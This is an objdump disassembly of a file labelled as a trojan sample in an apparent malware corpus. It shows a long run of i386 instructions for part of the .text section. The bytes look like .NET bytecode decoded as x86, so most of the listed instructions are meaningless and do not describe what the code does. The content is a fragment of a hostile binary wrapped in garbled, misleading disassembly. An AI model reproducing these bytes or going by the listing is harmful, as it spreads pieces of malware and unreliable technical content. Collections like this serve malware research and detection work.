
malware_samples/trojan/426c07651b7c6305a5b4e297a8f0b9d878193ee3d53d7a2b43957684481acbaa.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	5b                   	pop    %ebx
  402001:	3b 00                	cmp    (%eax),%eax
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 c4 26 00       	add    $0x26c400,%eax
  402013:	00 b0 13 00 00 03    	add    %dh,0x3000013(%eax)
  402019:	00 02                	add    %al,(%edx)
  40201b:	00 0a                	add    %cl,(%edx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	36 00 72 01          	add    %dh,%ss:0x1(%edx)
  402054:	00 00                	add    %al,(%eax)
  402056:	70 28                	jo     0x402080
  402058:	10 00                	adc    %al,(%eax)
  40205a:	00 0a                	add    %cl,(%edx)
  40205c:	00 2a                	add    %ch,(%edx)
  40205e:	00 00                	add    %al,(%eax)
  402060:	13 30                	adc    (%eax),%esi
  402062:	05 00 74 00 00       	add    $0x7400,%eax
  402067:	00 01                	add    %al,(%ecx)
  402069:	00 00                	add    %al,(%eax)
  40206b:	11 00                	adc    %eax,(%eax)
  40206d:	02 72 2d             	add    0x2d(%edx),%dh
  402070:	00 00                	add    %al,(%eax)
  402072:	70 1b                	jo     0x40208f
  402074:	6f                   	outsl  %ds:(%esi),(%dx)
  402075:	11 00                	adc    %eax,(%eax)
  402077:	00 0a                	add    %cl,(%edx)
  402079:	0b 07                	or     (%edi),%eax
  40207b:	2c 09                	sub    $0x9,%al
  40207d:	02 18                	add    (%eax),%bl
  40207f:	6f                   	outsl  %ds:(%esi),(%dx)
  402080:	12 00                	adc    (%eax),%al
  402082:	00 0a                	add    %cl,(%edx)
  402084:	10 00                	adc    %al,(%eax)
  402086:	02 6f 13             	add    0x13(%edi),%ch
  402089:	00 00                	add    %al,(%eax)
  40208b:	0a 18                	or     (%eax),%bl
  40208d:	5d                   	pop    %ebp
  40208e:	16                   	push   %ss
  40208f:	fe 03                	incb   (%ebx)
  402091:	0c 08                	or     $0x8,%al
  402093:	2c 0b                	sub    $0xb,%al
  402095:	72 33                	jb     0x4020ca
  402097:	00 00                	add    %al,(%eax)
  402099:	70 73                	jo     0x40210e
  40209b:	14 00                	adc    $0x0,%al
  40209d:	00 0a                	add    %cl,(%edx)
  40209f:	7a 02                	jp     0x4020a3
  4020a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4020a2:	13 00                	adc    (%eax),%eax
  4020a4:	00 0a                	add    %cl,(%edx)
  4020a6:	18 5b 8d             	sbb    %bl,-0x73(%ebx)
  4020a9:	1b 00                	sbb    (%eax),%eax
  4020ab:	00 01                	add    %al,(%ecx)
  4020ad:	0a 16                	or     (%esi),%dl
  4020af:	0d 2b 1a 00 06       	or     $0x6001a2b,%eax
  4020b4:	09 02                	or     %eax,(%edx)
  4020b6:	09 18                	or     %ebx,(%eax)
  4020b8:	5a                   	pop    %edx
  4020b9:	18 6f 15             	sbb    %ch,0x15(%edi)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	0a 1f                	or     (%edi),%bl
  4020c0:	10 28                	adc    %ch,(%eax)
  4020c2:	16                   	push   %ss
  4020c3:	00 00                	add    %al,(%eax)
  4020c5:	0a 9c 00 09 17 58 0d 	or     0xd581709(%eax,%eax,1),%bl
  4020cc:	09 06                	or     %eax,(%esi)
  4020ce:	8e 69 fe             	mov    -0x2(%ecx),%gs
  4020d1:	04 13                	add    $0x13,%al
  4020d3:	04 11                	add    $0x11,%al
  4020d5:	04 2d                	add    $0x2d,%al
  4020d7:	da 06                	fiaddl (%esi)
  4020d9:	13 05 2b 00 11 05    	adc    0x511002b,%eax
  4020df:	2a 1b                	sub    (%ebx),%bl
  4020e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4020e4:	95                   	xchg   %eax,%ebp
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	00 02                	add    %al,(%edx)
  4020e9:	00 00                	add    %al,(%eax)
  4020eb:	11 00                	adc    %eax,(%eax)
  4020ed:	28 17                	sub    %dl,(%edi)
  4020ef:	00 00                	add    %al,(%eax)
  4020f1:	0a 0a                	or     (%edx),%cl
  4020f3:	00 06                	add    %al,(%esi)
  4020f5:	03 6f 18             	add    0x18(%edi),%ebp
  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	0a 00                	or     (%eax),%al
  4020fc:	06                   	push   %es
  4020fd:	04 25                	add    $0x25,%al
  4020ff:	2d 08 26 1f 10       	sub    $0x101f2608,%eax
  402104:	8d 1b                	lea    (%ebx),%ebx
  402106:	00 00                	add    %al,(%eax)
  402108:	01 6f 19             	add    %ebp,0x19(%edi)
  40210b:	00 00                	add    %al,(%eax)
  40210d:	0a 00                	or     (%eax),%al
  40210f:	06                   	push   %es
  402110:	17                   	pop    %ss
  402111:	6f                   	outsl  %ds:(%esi),(%dx)
  402112:	1a 00                	sbb    (%eax),%al
  402114:	00 0a                	add    %cl,(%edx)
  402116:	00 06                	add    %al,(%esi)
  402118:	17                   	pop    %ss
  402119:	6f                   	outsl  %ds:(%esi),(%dx)
  40211a:	1b 00                	sbb    (%eax),%eax
  40211c:	00 0a                	add    %cl,(%edx)
  40211e:	00 00                	add    %al,(%eax)
  402120:	06                   	push   %es
  402121:	18 6f 1b             	sbb    %ch,0x1b(%edi)
  402124:	00 00                	add    %al,(%eax)
  402126:	0a 00                	or     (%eax),%al
  402128:	06                   	push   %es
  402129:	6f                   	outsl  %ds:(%esi),(%dx)
  40212a:	1c 00                	sbb    $0x0,%al
  40212c:	00 0a                	add    %cl,(%edx)
  40212e:	0b 00                	or     (%eax),%eax
  402130:	07                   	pop    %es
  402131:	02 16                	add    (%esi),%dl
  402133:	02 8e 69 6f 1d 00    	add    0x1d6f69(%esi),%cl
  402139:	00 0a                	add    %cl,(%edx)
  40213b:	0c de                	or     $0xde,%al
  40213d:	41                   	inc    %ecx
  40213e:	07                   	pop    %es
  40213f:	2c 07                	sub    $0x7,%al
  402141:	07                   	pop    %es
  402142:	6f                   	outsl  %ds:(%esi),(%dx)
  402143:	1e                   	push   %ds
  402144:	00 00                	add    %al,(%eax)
  402146:	0a 00                	or     (%eax),%al
  402148:	dc 26                	fsubl  (%esi)
  40214a:	00 06                	add    %al,(%esi)
  40214c:	17                   	pop    %ss
  40214d:	6f                   	outsl  %ds:(%esi),(%dx)
  40214e:	1b 00                	sbb    (%eax),%eax
  402150:	00 0a                	add    %cl,(%edx)
  402152:	00 06                	add    %al,(%esi)
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	1c 00                	sbb    $0x0,%al
  402157:	00 0a                	add    %cl,(%edx)
  402159:	0d 00 09 02 16       	or     $0x16020900,%eax
  40215e:	02 8e 69 6f 1d 00    	add    0x1d6f69(%esi),%cl
  402164:	00 0a                	add    %cl,(%edx)
  402166:	0c de                	or     $0xde,%al
  402168:	16                   	push   %ss
  402169:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  40216c:	09 6f 1e             	or     %ebp,0x1e(%edi)
  40216f:	00 00                	add    %al,(%eax)
  402171:	0a 00                	or     (%eax),%al
  402173:	dc 06                	faddl  (%esi)
  402175:	2c 07                	sub    $0x7,%al
  402177:	06                   	push   %es
  402178:	6f                   	outsl  %ds:(%esi),(%dx)
  402179:	1e                   	push   %ds
  40217a:	00 00                	add    %al,(%eax)
  40217c:	0a 00                	or     (%eax),%al
  40217e:	dc 08                	fmull  (%eax)
  402180:	2a 00                	sub    (%eax),%al
  402182:	00 00                	add    %al,(%eax)
  402184:	01 34 00             	add    %esi,(%eax,%eax,1)
  402187:	00 02                	add    %al,(%edx)
  402189:	00 43 00             	add    %al,0x0(%ebx)
  40218c:	0f 52 00             	rsqrtps (%eax),%xmm0
  40218f:	0b 00                	or     (%eax),%eax
  402191:	00 00                	add    %al,(%eax)
  402193:	00 02                	add    %al,(%edx)
  402195:	00 6e 00             	add    %ch,0x0(%esi)
  402198:	0f 7d                	(bad)
  40219a:	00 0b                	add    %cl,(%ebx)
  40219c:	00 00                	add    %al,(%eax)
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	00 00                	add    %al,(%eax)
  4021a2:	33 00                	xor    (%eax),%eax
  4021a4:	2a 5d 00             	sub    0x0(%ebp),%bl
  4021a7:	2b 10                	sub    (%eax),%edx
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	01 02                	add    %eax,(%edx)
  4021ad:	00 07                	add    %al,(%edi)
  4021af:	00 81 88 00 0b 00    	add    %al,0xb0088(%ecx)
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	00 1b                	add    %bl,(%ebx)
  4021b9:	30 0a                	xor    %cl,(%edx)
  4021bb:	00 81 04 00 00 03    	add    %al,0x3000004(%ecx)
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	11 00                	adc    %eax,(%eax)
  4021c5:	02 8e 16 fe 01 13    	add    0x1301fe16(%esi),%cl
  4021cb:	0e                   	push   %cs
  4021cc:	11 0e                	adc    %ecx,(%esi)
  4021ce:	2c 0f                	sub    $0xf,%al
  4021d0:	00 28                	add    %ch,(%eax)
  4021d2:	07                   	pop    %es
  4021d3:	00 00                	add    %al,(%eax)
  4021d5:	06                   	push   %es
  4021d6:	00 16                	add    %dl,(%esi)
  4021d8:	13 0f                	adc    (%edi),%ecx
  4021da:	38 63 04             	cmp    %ah,0x4(%ebx)
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	14 0a                	adc    $0xa,%al
  4021e1:	72 67                	jb     0x40224a
  4021e3:	00 00                	add    %al,(%eax)
  4021e5:	70 0b                	jo     0x4021f2
  4021e7:	16                   	push   %ss
  4021e8:	0c 14                	or     $0x14,%al
  4021ea:	0d 14 13 04 16       	or     $0x16041314,%eax
  4021ef:	13 05 16 13 10 38    	adc    0x38101316,%eax
  4021f5:	ac                   	lods   %ds:(%esi),%al
  4021f6:	01 00                	add    %eax,(%eax)
  4021f8:	00 00                	add    %al,(%eax)
  4021fa:	02 11                	add    (%ecx),%dl
  4021fc:	10 9a 13 12 11 12    	adc    %bl,0x12111213(%edx)
  402202:	13 11                	adc    (%ecx),%edx
  402204:	11 11                	adc    %edx,(%ecx)
  402206:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402209:	00 06                	add    %al,(%esi)
  40220b:	13 13                	adc    (%ebx),%edx
  40220d:	11 13                	adc    %edx,(%ebx)
  40220f:	20 67 93             	and    %ah,-0x6d(%edi)
  402212:	4e                   	dec    %esi
  402213:	4f                   	dec    %edi
  402214:	35 41 11 13 20       	xor    $0x20131141,%eax
  402219:	af                   	scas   %es:(%edi),%eax
  40221a:	22 7a 0c             	and    0xc(%edx),%bh
  40221d:	35 1c 11 13 20       	xor    $0x2013111c,%eax
  402222:	17                   	pop    %ss
  402223:	16                   	push   %ss
  402224:	7a 04                	jp     0x40222a
  402226:	2e 6d                	cs insl (%dx),%es:(%edi)
  402228:	2b 00                	sub    (%eax),%eax
  40222a:	11 13                	adc    %edx,(%ebx)
  40222c:	20 af 22 7a 0c 3b    	and    %ch,0x3b0c7a22(%edi)
  402232:	ae                   	scas   %es:(%edi),%al
  402233:	00 00                	add    %al,(%eax)
  402235:	00 38                	add    %bh,(%eax)
  402237:	41                   	inc    %ecx
  402238:	01 00                	add    %eax,(%eax)
  40223a:	00 11                	add    %dl,(%ecx)
  40223c:	13 20                	adc    (%eax),%esp
  40223e:	8b ac e3 2b 3b d0 00 	mov    0xd03b2b(%ebx,%eiz,8),%ebp
  402245:	00 00                	add    %al,(%eax)
  402247:	2b 00                	sub    (%eax),%eax
  402249:	11 13                	adc    %edx,(%ebx)
  40224b:	20 67 93             	and    %ah,-0x6d(%edi)
  40224e:	4e                   	dec    %esi
  40224f:	4f                   	dec    %edi
  402250:	2e 7f 38             	jg,pn  0x40228b
  402253:	25 01 00 00 11       	and    $0x11000001,%eax
  402258:	13 20                	adc    (%eax),%esp
  40225a:	34 31                	xor    $0x31,%al
  40225c:	10 8c 35 1c 11 13 20 	adc    %cl,0x2013111c(%ebp,%esi,1)
  402263:	f0 79 cd             	lock jns 0x402233
  402266:	5b                   	pop    %ebx
  402267:	3b 9b 00 00 00 2b    	cmp    0x2b000000(%ebx),%ebx
  40226d:	00 11                	add    %dl,(%ecx)
  40226f:	13 20                	adc    (%eax),%esp
  402271:	34 31                	xor    $0x31,%al
  402273:	10 8c 2e 47 38 00 01 	adc    %cl,0x1003847(%esi,%ebp,1)
  40227a:	00 00                	add    %al,(%eax)
  40227c:	11 13                	adc    %edx,(%ebx)
  40227e:	20 0b                	and    %cl,(%ebx)
  402280:	a0 db 97 2e 72       	mov    0x722e97db,%al
  402285:	2b 00                	sub    (%eax),%eax
  402287:	11 13                	adc    %edx,(%ebx)
  402289:	20 89 7f b2 d2 2e    	and    %cl,0x2ed2b27f(%ecx)
  40228f:	1b 38                	sbb    (%eax),%edi
  402291:	e7 00                	out    %eax,$0x0
  402293:	00 00                	add    %al,(%eax)
  402295:	11 11                	adc    %edx,(%ecx)
  402297:	72 a1                	jb     0x40223a
  402299:	00 00                	add    %al,(%eax)
  40229b:	70 28                	jo     0x4022c5
  40229d:	1f                   	pop    %ds
  40229e:	00 00                	add    %al,(%eax)
  4022a0:	0a 3a                	or     (%edx),%bh
  4022a2:	81 00 00 00 38 d1    	addl   $0xd1380000,(%eax)
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	00 11                	add    %dl,(%ecx)
  4022ac:	11 72 a9             	adc    %esi,-0x57(%edx)
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	70 28                	jo     0x4022db
  4022b3:	1f                   	pop    %ds
  4022b4:	00 00                	add    %al,(%eax)
  4022b6:	0a 2d 7a 38 be 00    	or     0xbe387a,%ch
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	11 11                	adc    %edx,(%ecx)
  4022c0:	72 b3                	jb     0x402275
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	70 28                	jo     0x4022ee
  4022c6:	1f                   	pop    %ds
  4022c7:	00 00                	add    %al,(%eax)
  4022c9:	0a 2d 73 38 ab 00    	or     0xab3873,%ch
  4022cf:	00 00                	add    %al,(%eax)
  4022d1:	11 11                	adc    %edx,(%ecx)
  4022d3:	72 bd                	jb     0x402292
  4022d5:	00 00                	add    %al,(%eax)
  4022d7:	70 28                	jo     0x402301
  4022d9:	1f                   	pop    %ds
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	0a 2d 64 38 98 00    	or     0x983864,%ch
  4022e2:	00 00                	add    %al,(%eax)
  4022e4:	11 11                	adc    %edx,(%ecx)
  4022e6:	72 c7                	jb     0x4022af
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	70 28                	jo     0x402314
  4022ec:	1f                   	pop    %ds
  4022ed:	00 00                	add    %al,(%eax)
  4022ef:	0a 2d 5d 38 85 00    	or     0x85385d,%ch
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	11 11                	adc    %edx,(%ecx)
  4022f9:	72 cf                	jb     0x4022ca
  4022fb:	00 00                	add    %al,(%eax)
  4022fd:	70 28                	jo     0x402327
  4022ff:	1f                   	pop    %ds
  402300:	00 00                	add    %al,(%eax)
  402302:	0a 2d 57 2b 75 11    	or     0x11752b57,%ch
  402308:	11 72 dd             	adc    %esi,-0x23(%edx)
  40230b:	00 00                	add    %al,(%eax)
  40230d:	70 28                	jo     0x402337
  40230f:	1f                   	pop    %ds
  402310:	00 00                	add    %al,(%eax)
  402312:	0a 2d 59 2b 65 11    	or     0x11652b59,%ch
  402318:	11 72 e3             	adc    %esi,-0x1d(%edx)
  40231b:	00 00                	add    %al,(%eax)
  40231d:	70 28                	jo     0x402347
  40231f:	1f                   	pop    %ds
  402320:	00 00                	add    %al,(%eax)
  402322:	0a 2d 49 2b 55 02    	or     0x2552b49,%ch
  402328:	11 10                	adc    %edx,(%eax)
  40232a:	17                   	pop    %ss
  40232b:	58                   	pop    %eax
  40232c:	25 13 10 9a 0a       	and    $0xa9a1013,%eax
  402331:	2b 6b 02             	sub    0x2(%ebx),%ebp
  402334:	11 10                	adc    %edx,(%eax)
  402336:	17                   	pop    %ss
  402337:	58                   	pop    %eax
  402338:	25 13 10 9a 0b       	and    $0xb9a1013,%eax
  40233d:	2b 5f 17             	sub    0x17(%edi),%ebx
  402340:	0c 2b                	or     $0x2b,%al
  402342:	5b                   	pop    %ebx
  402343:	02 11                	add    (%ecx),%dl
  402345:	10 17                	adc    %dl,(%edi)
  402347:	58                   	pop    %eax
  402348:	25 13 10 9a 0d       	and    $0xd9a1013,%eax
  40234d:	2b 4f 02             	sub    0x2(%edi),%ecx
  402350:	11 10                	adc    %edx,(%eax)
  402352:	17                   	pop    %ss
  402353:	58                   	pop    %eax
  402354:	25 13 10 9a 13       	and    $0x139a1013,%eax
  402359:	04 2b                	add    $0x2b,%al
  40235b:	42                   	inc    %edx
  40235c:	02 11                	add    (%ecx),%dl
  40235e:	10 17                	adc    %dl,(%edi)
  402360:	58                   	pop    %eax
  402361:	25 13 10 9a 28       	and    $0x289a1013,%eax
  402366:	20 00                	and    %al,(%eax)
  402368:	00 0a                	add    %cl,(%edx)
  40236a:	13 05 2b 30 28 07    	adc    0x728302b,%eax
  402370:	00 00                	add    %al,(%eax)
  402372:	06                   	push   %es
  402373:	00 16                	add    %dl,(%esi)
  402375:	13 0f                	adc    (%edi),%ecx
  402377:	38 c6                	cmp    %al,%dh
  402379:	02 00                	add    (%eax),%al
  40237b:	00 72 ef             	add    %dh,-0x11(%edx)
  40237e:	00 00                	add    %al,(%eax)
  402380:	70 02                	jo     0x402384
  402382:	11 10                	adc    %edx,(%eax)
  402384:	9a 28 21 00 00 0a 28 	lcall  $0x280a,$0x2128
  40238b:	10 00                	adc    %al,(%eax)
  40238d:	00 0a                	add    %cl,(%edx)
  40238f:	00 28                	add    %ch,(%eax)
  402391:	07                   	pop    %es
  402392:	00 00                	add    %al,(%eax)
  402394:	06                   	push   %es
  402395:	00 17                	add    %dl,(%edi)
  402397:	13 0f                	adc    (%edi),%ecx
  402399:	38 a4 02 00 00 00 11 	cmp    %ah,0x11000000(%edx,%eax,1)
  4023a0:	10 17                	adc    %dl,(%edi)
  4023a2:	58                   	pop    %eax
  4023a3:	13 10                	adc    (%eax),%edx
  4023a5:	11 10                	adc    %edx,(%eax)
  4023a7:	02 8e 69 fe 04 13    	add    0x1304fe69(%esi),%cl
  4023ad:	14 11                	adc    $0x11,%al
  4023af:	14 3a                	adc    $0x3a,%al
  4023b1:	44                   	inc    %esp
  4023b2:	fe                   	(bad)
  4023b3:	ff                   	(bad)
  4023b4:	ff 06                	incl   (%esi)
  4023b6:	28 22                	sub    %ah,(%edx)
  4023b8:	00 00                	add    %al,(%eax)
  4023ba:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  4023bd:	07                   	pop    %es
  4023be:	28 22                	sub    %ah,(%edx)
  4023c0:	00 00                	add    %al,(%eax)
  4023c2:	0a 2d 08 09 28 22    	or     0x22280908,%ch
  4023c8:	00 00                	add    %al,(%eax)
  4023ca:	0a 2b                	or     (%ebx),%ch
  4023cc:	01 17                	add    %edx,(%edi)
  4023ce:	13 15 11 15 2c 1a    	adc    0x1a2c1511,%edx
  4023d4:	00 72 0f             	add    %dh,0xf(%edx)
  4023d7:	01 00                	add    %eax,(%eax)
  4023d9:	70 28                	jo     0x402403
  4023db:	10 00                	adc    %al,(%eax)
  4023dd:	00 0a                	add    %cl,(%edx)
  4023df:	00 28                	add    %ch,(%eax)
  4023e1:	07                   	pop    %es
  4023e2:	00 00                	add    %al,(%eax)
  4023e4:	06                   	push   %es
  4023e5:	00 17                	add    %dl,(%edi)
  4023e7:	13 0f                	adc    (%edi),%ecx
  4023e9:	38 54 02 00          	cmp    %dl,0x0(%edx,%eax,1)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	00 07                	add    %al,(%edi)
  4023f1:	28 22                	sub    %ah,(%edx)
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	0a 16                	or     (%esi),%dl
  4023f7:	fe 01                	incb   (%ecx)
  4023f9:	13 16                	adc    (%esi),%edx
  4023fb:	11 16                	adc    %edx,(%esi)
  4023fd:	2c 55                	sub    $0x55,%al
  4023ff:	00 73 23             	add    %dh,0x23(%ebx)
  402402:	00 00                	add    %al,(%eax)
  402404:	0a 13                	or     (%ebx),%dl
  402406:	17                   	pop    %ss
  402407:	00 08                	add    %cl,(%eax)
  402409:	13 18                	adc    (%eax),%ebx
  40240b:	11 18                	adc    %ebx,(%eax)
  40240d:	2c 21                	sub    $0x21,%al
  40240f:	00 11                	add    %dl,(%ecx)
  402411:	17                   	pop    %ss
  402412:	07                   	pop    %es
  402413:	6f                   	outsl  %ds:(%esi),(%dx)
  402414:	24 00                	and    $0x0,%al
  402416:	00 0a                	add    %cl,(%edx)
  402418:	6f                   	outsl  %ds:(%esi),(%dx)
  402419:	25 00 00 0a 6f       	and    $0x6f0a0000,%eax
  40241e:	26 00 00             	add    %al,%es:(%eax)
  402421:	0a 13                	or     (%ebx),%dl
  402423:	19 11                	sbb    %edx,(%ecx)
  402425:	19 28                	sbb    %ebp,(%eax)
  402427:	27                   	daa
  402428:	00 00                	add    %al,(%eax)
  40242a:	0a 13                	or     (%ebx),%dl
  40242c:	06                   	push   %es
  40242d:	00 2b                	add    %ch,(%ebx)
  40242f:	11 00                	adc    %eax,(%eax)
  402431:	11 17                	adc    %edx,(%edi)
  402433:	07                   	pop    %es
  402434:	6f                   	outsl  %ds:(%esi),(%dx)
  402435:	28 00                	sub    %al,(%eax)
  402437:	00 0a                	add    %cl,(%edx)
  402439:	6f                   	outsl  %ds:(%esi),(%dx)
  40243a:	29 00                	sub    %eax,(%eax)
  40243c:	00 0a                	add    %cl,(%edx)
  40243e:	13 06                	adc    (%esi),%eax
  402440:	00 00                	add    %al,(%eax)
  402442:	de 0d 11 17 2c 08    	fimuls 0x82c1711
  402448:	11 17                	adc    %edx,(%edi)
  40244a:	6f                   	outsl  %ds:(%esi),(%dx)
  40244b:	1e                   	push   %ds
  40244c:	00 00                	add    %al,(%eax)
  40244e:	0a 00                	or     (%eax),%al
  402450:	dc 00                	faddl  (%eax)
  402452:	2b 2d 00 08 13 1a    	sub    0x1a130800,%ebp
  402458:	11 1a                	adc    %ebx,(%edx)
  40245a:	2c 1a                	sub    $0x1a,%al
  40245c:	00 06                	add    %al,(%esi)
  40245e:	28 2a                	sub    %ch,(%edx)
  402460:	00 00                	add    %al,(%eax)
  402462:	0a 6f 26             	or     0x26(%edi),%ch
  402465:	00 00                	add    %al,(%eax)
  402467:	0a 13                	or     (%ebx),%dl
  402469:	1b 11                	sbb    (%ecx),%edx
  40246b:	1b 28                	sbb    (%eax),%ebp
  40246d:	27                   	daa
  40246e:	00 00                	add    %al,(%eax)
  402470:	0a 13                	or     (%ebx),%dl
  402472:	06                   	push   %es
  402473:	00 2b                	add    %ch,(%ebx)
  402475:	0a 00                	or     (%eax),%al
  402477:	06                   	push   %es
  402478:	28 2b                	sub    %ch,(%ebx)
  40247a:	00 00                	add    %al,(%eax)
  40247c:	0a 13                	or     (%ebx),%dl
  40247e:	06                   	push   %es
  40247f:	00 00                	add    %al,(%eax)
  402481:	00 de                	add    %bl,%dh
  402483:	22 13                	and    (%ebx),%dl
  402485:	1c 00                	sbb    $0x0,%al
  402487:	72 39                	jb     0x4024c2
  402489:	01 00                	add    %eax,(%eax)
  40248b:	70 11                	jo     0x40249e
  40248d:	1c 6f                	sbb    $0x6f,%al
  40248f:	2c 00                	sub    $0x0,%al
  402491:	00 0a                	add    %cl,(%edx)
  402493:	28 21                	sub    %ah,(%ecx)
  402495:	00 00                	add    %al,(%eax)
  402497:	0a 28                	or     (%eax),%ch
  402499:	10 00                	adc    %al,(%eax)
  40249b:	00 0a                	add    %cl,(%edx)
  40249d:	00 18                	add    %bl,(%eax)
  40249f:	13 0f                	adc    (%edi),%ecx
  4024a1:	dd 9c 01 00 00 14 13 	fstpl  0x13140000(%ecx,%eax,1)
  4024a8:	08 00                	or     %al,(%eax)
  4024aa:	09 28                	or     %ebp,(%eax)
  4024ac:	08 00                	or     %al,(%eax)
  4024ae:	00 06                	add    %al,(%esi)
  4024b0:	13 07                	adc    (%edi),%eax
  4024b2:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4024b5:	22 00                	and    (%eax),%al
  4024b7:	00 0a                	add    %cl,(%edx)
  4024b9:	16                   	push   %ss
  4024ba:	fe 01                	incb   (%ecx)
  4024bc:	13 1d 11 1d 2c 09    	adc    0x92c1d11,%ebx
  4024c2:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4024c5:	08 00                	or     %al,(%eax)
  4024c7:	00 06                	add    %al,(%esi)
  4024c9:	13 08                	adc    (%eax),%ecx
  4024cb:	11 08                	adc    %ecx,(%eax)
  4024cd:	14 fe                	adc    $0xfe,%al
  4024cf:	01 13                	add    %edx,(%ebx)
  4024d1:	1e                   	push   %ds
  4024d2:	11 1e                	adc    %ebx,(%esi)
  4024d4:	2c 09                	sub    $0x9,%al
  4024d6:	1f                   	pop    %ds
  4024d7:	10 8d 1b 00 00 01    	adc    %cl,0x100001b(%ebp)
  4024dd:	13 08                	adc    (%eax),%ecx
  4024df:	00 de                	add    %bl,%dh
  4024e1:	22 13                	and    (%ebx),%dl
  4024e3:	1f                   	pop    %ds
  4024e4:	00 72 6f             	add    %dh,0x6f(%edx)
  4024e7:	01 00                	add    %eax,(%eax)
  4024e9:	70 11                	jo     0x4024fc
  4024eb:	1f                   	pop    %ds
  4024ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ed:	2c 00                	sub    $0x0,%al
  4024ef:	00 0a                	add    %cl,(%edx)
  4024f1:	28 21                	sub    %ah,(%ecx)
  4024f3:	00 00                	add    %al,(%eax)
  4024f5:	0a 28                	or     (%eax),%ch
  4024f7:	10 00                	adc    %al,(%eax)
  4024f9:	00 0a                	add    %cl,(%edx)
  4024fb:	00 19                	add    %bl,(%ecx)
  4024fd:	13 0f                	adc    (%edi),%ecx
  4024ff:	dd 3e                	fnstsw (%esi)
  402501:	01 00                	add    %eax,(%eax)
  402503:	00 11                	add    %dl,(%ecx)
  402505:	07                   	pop    %es
  402506:	8e 69 1f             	mov    0x1f(%ecx),%gs
  402509:	10 2e                	adc    %ch,(%esi)
  40250b:	0d 11 07 8e 69       	or     $0x698e0711,%eax
  402510:	1f                   	pop    %ds
  402511:	20 fe                	and    %bh,%dh
  402513:	01 16                	add    %edx,(%esi)
  402515:	fe 01                	incb   (%ecx)
  402517:	2b 01                	sub    (%ecx),%eax
  402519:	16                   	push   %ss
  40251a:	13 20                	adc    (%eax),%esp
  40251c:	11 20                	adc    %esp,(%eax)
  40251e:	2c 14                	sub    $0x14,%al
  402520:	00 72 99             	add    %dh,-0x67(%edx)
  402523:	01 00                	add    %eax,(%eax)
  402525:	70 28                	jo     0x40254f
  402527:	10 00                	adc    %al,(%eax)
  402529:	00 0a                	add    %cl,(%edx)
  40252b:	00 1a                	add    %bl,(%edx)
  40252d:	13 0f                	adc    (%edi),%ecx
  40252f:	38 0e                	cmp    %cl,(%esi)
  402531:	01 00                	add    %eax,(%eax)
  402533:	00 00                	add    %al,(%eax)
  402535:	00 11                	add    %dl,(%ecx)
  402537:	06                   	push   %es
  402538:	11 07                	adc    %eax,(%edi)
  40253a:	11 08                	adc    %ecx,(%eax)
  40253c:	28 09                	sub    %cl,(%ecx)
  40253e:	00 00                	add    %al,(%eax)
  402540:	06                   	push   %es
  402541:	13 09                	adc    (%ecx),%ecx
  402543:	00 de                	add    %bl,%dh
  402545:	22 13                	and    (%ebx),%dl
  402547:	21 00                	and    %eax,(%eax)
  402549:	72 1c                	jb     0x402567
  40254b:	02 00                	add    (%eax),%al
  40254d:	70 11                	jo     0x402560
  40254f:	21 6f 2c             	and    %ebp,0x2c(%edi)
  402552:	00 00                	add    %al,(%eax)
  402554:	0a 28                	or     (%eax),%ch
  402556:	21 00                	and    %eax,(%eax)
  402558:	00 0a                	add    %cl,(%edx)
  40255a:	28 10                	sub    %dl,(%eax)
  40255c:	00 00                	add    %al,(%eax)
  40255e:	0a 00                	or     (%eax),%al
  402560:	1b 13                	sbb    (%ebx),%edx
  402562:	0f dd da             	paddusw %mm2,%mm3
  402565:	00 00                	add    %al,(%eax)
  402567:	00 72 44             	add    %dh,0x44(%edx)
  40256a:	02 00                	add    (%eax),%al
  40256c:	70 11                	jo     0x40257f
  40256e:	09 8e 69 8c 21 00    	or     %ecx,0x218c69(%esi)
  402574:	00 01                	add    %al,(%ecx)
  402576:	28 2d 00 00 0a 28    	sub    %ch,0x280a0000
  40257c:	10 00                	adc    %al,(%eax)
  40257e:	00 0a                	add    %cl,(%edx)
  402580:	00 12                	add    %dl,(%edx)
  402582:	0a fe                	or     %dh,%bh
  402584:	15 04 00 00 02       	adc    $0x2000004,%eax
  402589:	12 0a                	adc    (%edx),%cl
  40258b:	d0 04 00             	rolb   $1,(%eax,%eax,1)
  40258e:	00 02                	add    %al,(%edx)
  402590:	28 2e                	sub    %ch,(%esi)
  402592:	00 00                	add    %al,(%eax)
  402594:	0a 28                	or     (%eax),%ch
  402596:	2f                   	das
  402597:	00 00                	add    %al,(%eax)
  402599:	0a 7d 06             	or     0x6(%ebp),%bh
  40259c:	00 00                	add    %al,(%eax)
  40259e:	04 12                	add    $0x12,%al
  4025a0:	0a 17                	or     (%edi),%dl
  4025a2:	7d 11                	jge    0x4025b5
  4025a4:	00 00                	add    %al,(%eax)
  4025a6:	04 72                	add    $0x72,%al
